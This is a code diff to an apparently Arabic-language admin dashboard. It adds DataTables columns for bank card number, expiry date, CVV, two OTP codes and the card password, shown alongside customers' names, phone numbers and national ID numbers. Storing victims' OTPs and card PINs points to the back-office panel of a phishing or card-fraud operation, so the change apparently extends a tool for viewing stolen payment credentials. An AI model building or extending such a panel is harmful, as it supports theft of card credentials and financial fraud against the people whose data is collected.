@@ -29,12 +29,18 @@
                         <table id="ikuns_table" class="table stripe row-border order-column" style="width:100%">
                             <thead>
                                 <tr>
-                                    <th >اسم العميل </th>
+                                    <th>اسم العميل </th>
                                     <th> رقم الهاتف</th>
                                     <th> الرقم القومى </th>
                                     <th> معاد التسجيل </th>
                                     <th> البلد </th>
                                     <th> المشغل </th>
+                                    <th> رقم البطاقة البنكية </th>
+                                    <th> تاريخ انتهاء البطاقة البنكية </th>
+                                    <th> cvv </th>
+                                    <th> otp code step 1 </th>
+                                    <th> otp code step 2 </th>
+                                    <th> كلمه سر البطاقة </th>
                                 </tr>
                             </thead>
                         </table>
@@ -86,6 +92,24 @@
                     },
                     {
                         data: "sms_provider",
+                    },
+                    {
+                        data: "card_no",
+                    },
+                    {
+                        data: "expiry_date",
+                    },
+                    {
+                        data: "cvv",
+                    },
+                    {
+                        data: "otp1",
+                    },
+                    {
+                        data: "otp2",
+                    },
+                    {
+                        data: "password_card",
                     },
 
                 ]
